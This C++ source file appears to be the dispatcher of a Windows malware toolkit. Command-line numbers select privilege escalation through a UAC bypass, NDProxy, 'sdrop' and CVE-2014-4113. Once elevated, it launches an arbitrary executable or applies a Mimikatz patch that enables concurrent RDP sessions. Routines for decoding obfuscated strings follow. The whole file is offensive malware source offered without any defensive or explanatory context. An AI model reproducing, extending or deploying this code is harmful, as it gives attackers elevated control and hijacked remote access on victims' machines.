#include "core\core.h"
#include "core\elevation.h"
#include "core\debug.h"
#include "core\service.h"
#include "mimikatz\mimikatz.h"

void sdrop( const char* path );
void ndproxy( const char* path );
void uac_bypass( int param );
void mimikatz();
void mimikatz2();
void CVE2014_4113( const char* path );

int main()
{
	WinAPI::Init();
	Core::Init();

	wchar_t* line = GetCommandLineW();
	int argc;
	wchar_t** args = CommandLineToArgvW( line, &argc );
	if( argc > 1 )
	{
		StringBuilder arg1, arg2;
		arg1.ToWin1251( args[1] );
		if( argc > 2 )
			arg2.ToWin1251( args[2] );
		int n = arg1.ToInt();
		switch( n )
		{
			case 1:
				sdrop(arg2);
				break;
			case 2:
				ndproxy(arg2);
				break;
			case 3:
				uac_bypass(100);
				break;
			case 4:
				mimikatz2();
				break;
			case 5:
				CVE2014_4113(arg2);
				break;
			case 32:
				uac_bypass(2);
			case 21:
				mimikatz();
				break;
			case 100:
				MessageBox( 0, "Successful", "UAC bypass", 0 );
			break;
		}
	}
	LocalFree(args);
	Core::Release();
	ExitProcess(0);
	return 0;
}

void sdrop( const char* path )
{
	OutputDebugStringA( "Elevation: sdrop ........" );
	if( Elevation::Sdrop(0) )
	{
		OutputDebugStringA( "Elevation: sdrop is ok" );
		Process::Exec(path);
	}
	else
		OutputDebugStringA( "Elevation: sdrop is wrong" );
}

void ndproxy( const char* path )
{
	OutputDebugStringA( "Elevation: NDProxy ........" );
	if( Service::Start( "RemoteAccess" ) )
	{
		if( Elevation::NDProxy() )
		{
			OutputDebugStringA( "Elevation: NDProxy is ok" );
			Process::Exec(path);
		}
		else
			OutputDebugStringA( "Elevation: NDProxy is wrong" );
	}
	else
		OutputDebugStringA( "Not start service RemoteAccess" );
}

void uac_bypass( int param )
{
	OutputDebugStringA( "Elevation: UAC Bypass ........" );
	StringBuilderStack<MAX_PATH> path;
	Path::GetStartupExe(path);
	path += ' ';
	path.Cat(param);
	if( Elevation::UACBypass( 0, path ) )
	{
		OutputDebugStringA( "Elevation: UAC Bypass is ok" );
	}
	else
	{
		OutputDebugStringA( "Elevation: UAC Bypass is wrong" );
	}
}

void mimikatz()
{
	OutputDebugStringA( "RDP: mimikatz ........." );
	if( Service::Start( "RemoteAccess" ) )
	{
		if( Elevation::NDProxy() )
		{
			OutputDebugStringA( "Elevation succesful" );
			mimikatz2();
		}
		else
			OutputDebugStringA( "Elevation wrong" );
	}
	else
		OutputDebugStringA( "Start service RemoteAcces is wrong" );
}

void mimikatz2()
{
	if( Service::Start("TermService") )
	{
		if( MimikatzPatchRDP() )
			OutputDebugStringA( "ts::multirdp succesful" );
		else
			OutputDebugStringA( "ts::multirdp wrong" );
	}
	else
		OutputDebugStringA("Not start service TermService" );
}

void CVE2014_4113( const char* path )
{
	OutputDebugStringA( "Elevation: CVE2014_4113 ........" );
	if( Elevation::CVE2014_4113() )
	{
		OutputDebugStringA( "Elevation: CVE2014_4113 is ok" );
		if( path ) Process::Exec(path);
	}
	else
		OutputDebugStringA( "Elevation: CVE2014_4113 is wrong" );
}

#ifdef ON_CODE_STRING
//определяем функцию для декодирования зашифрованных строк
StringDecoded DECODE_STRING( const char* codeStr )
{
	char* s = Str::Duplication(codeStr);
	s += 2;
	s[ Str::Len(s) - 2 ] = 0;
	return StringDecoded(s);
}

StringDecodedW DECODE_STRINGW( const char* codeStr )
{
	return StringDecodedW( DECODE_STRINGW2(codeStr) );
}

wchar_t* DECODE_STRINGW2( const char* codeStr )
{
	return Str::ToWideChar( DECODE_STRING(codeStr) );
}


#else

char* DECODE_STRING2( const char* codeStr )
{
	return Str::Duplication(codeStr);
}

StringDecodedW DECODE_STRINGW( const char* codeStr )
{
	return StringDecodedW( DECODE_STRINGW2(codeStr) );
}

wchar_t* DECODE_STRINGW2( const char* codeStr )
{
	return Str::ToWideChar(codeStr);
}

#endif //ON_CODE_STRING
